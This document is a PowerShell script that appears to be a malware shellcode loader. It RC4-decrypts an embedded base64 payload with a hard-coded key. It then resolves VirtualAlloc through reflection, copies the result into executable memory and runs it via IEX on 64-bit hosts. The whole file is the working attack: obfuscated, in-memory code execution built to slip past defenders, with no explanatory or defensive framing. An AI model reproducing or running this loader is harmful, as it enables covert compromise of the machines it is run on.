
Set-StrictMode -Version 2
$DoIt = @'
function Crypt {
    param (
        [byte[]]$key,
        [byte[]]$data
    )

    $s = 0..255
    $j = 0

    for ($i = 0; $i -lt 256; $i++) {
        $j = ($j + $s[$i] + $key[$i % $key.Length]) % 256
        $s[$i], $s[$j] = $s[$j], $s[$i]
    }

    $i = $j = 0
    $output = [byte[]]::new($data.Length)

    for ($count = 0; $count -lt $data.Length; $count++) {
        $i = ($i + 1) % 256
        $j = ($j + $s[$i]) % 256
        $s[$i], $s[$j] = $s[$j], $s[$i]
        $k = $s[($s[$i] + $s[$j]) % 256]
        $output[$count] = $data[$count] -bxor $k
    }

    $output
}
function func_get_proc_address{
        Param($var_module, $var_procedure)
        $var_unsafe_native_methods = ([AppDomain]::CurrentDomain.GetAssemblies() | Where-Object { $_.GlobalAssemblyCache -And $_.Location.Split('\')[-1].Equals('System.dll') }).GetType('Microsoft.Win32.UnsafeNativeMethods')
        $var_gpa = $var_unsafe_native_methods.GetMethod('GetProcAddress',[Type[]] @('System.Runtime.InteropServices.HandleRef', 'string'))
        return $var_gpa.Invoke($null, @([System.Runtime.InteropServices.HandleRef](New-Object System.Runtime.InteropServices.HandleRef((New-Object IntPtr), ($var_unsafe_native_methods.GetMethod('GetModuleHandle')).Invoke($null, @($var_module)))), $var_procedure))
}
function func_get_delegate_type{
        Param(
                [Parameter(Position = 0, Mandatory = $True)][Type[]] $var_parameters,
                [Parameter(Position = 1)][Type] $var_return_type = [Void]
        )
        $var_type_builder = [AppDomain]::CurrentDomain.DefineDynamicAssembly((New-Object System.Reflection.AssemblyName('ReflectedDelegate')),[System.Reflection.Emit.AssemblyBuilderAccess]::Run).DefineDynamicModule('InMemoryModule', $false).DefineType('MyDelegateType', 'Class, Public, Sealed, AnsiClass, AutoClass',[System.MulticastDelegate])
        $var_type_builder.DefineConstructor('RTSpecialName, HideBySig, Public',[System.Reflection.CallingConventions]::Standard, $var_parameters).SetImplementationFlags('Runtime, Managed')
        $var_type_builder.DefineMethod('Invoke', 'Public, HideBySig, NewSlot, Virtual', $var_return_type, $var_parameters).SetImplementationFlags('Runtime, Managed')  
        return $var_type_builder.CreateType()
}
[Byte[]]$encryptedData = [System.Convert]::FromBase64String('TSXYM1m3RnSTddxzJSvlrEA/gpgMHVSEE69USosDL8BLK+5AJTt6oHR1cSsKwzF+NkenyKHUK4h6DQSdYQRkBQ==')
$key = [Text.Encoding]::ASCII.GetBytes("95WEPeyG")
$var_code = Crypt -key $key -data $encryptedData

$var_va = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer((func_get_proc_address kernel32.dll VirtualAlloc), (func_get_delegate_type @([IntPtr], [UInt32], [UInt32], [UInt32]) ([IntPtr])))
$var_buffer = $var_va.Invoke([IntPtr]::Zero, $var_code.Length, 0x3000, 0x40)
[System.Runtime.InteropServices.Marshal]::Copy($var_code, 0, $var_buffer, $var_code.length)
$var_runme = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($var_buffer, (func_get_delegate_type @([IntPtr]) ([Void])))
$var_runme.Invoke([IntPtr]::Zero)
'@
If([IntPtr]::size -eq 8) {
        IEX $DoIt
}